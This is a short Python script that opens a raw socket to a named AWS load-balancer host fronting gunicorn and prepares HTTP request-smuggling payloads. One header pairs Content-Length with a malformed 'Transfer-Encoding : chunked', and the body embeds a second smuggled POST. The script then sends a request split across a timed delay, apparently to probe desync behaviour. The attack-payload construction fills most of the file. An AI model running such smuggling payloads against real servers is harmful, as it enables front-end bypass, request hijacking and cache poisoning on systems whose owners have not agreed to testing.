import socket
import time

# Connect to the server
host = 'gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com'
port = 80
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
body = f"""0

POST / HTTP/1.1
Host: {host}
Content-Length: 107
Request: 2
Connection: keep-alive

Comm=""".replace('\n','\r\n')

header = f"""POST / HTTP/1.1
Host: {host}:{port}
Content-Length: {len(body)}
Request: 1
Transfer-Encoding : chunked

""".replace('\n','\r\n')
# Send the first part of the request
request_part1 = (
    "POST / HTTP/1.1\r\n"
    "Host: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\n"
    "Content-Length: 6\r\n"
    "\r\n"
    "usr"
)
sock.sendall(request_part1.encode())

# Wait for a bit before sending the rest
time.sleep(2)  # Adjust the delay as needed
# sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# sock2.connect((host, port))
# Send the rest of the request
request_part2 = "aaa"
sock.sendall(request_part2.encode())

# Receive the response from the server
response = sock.recv(4096)
print(response.decode())

# Close the connection
sock.close()

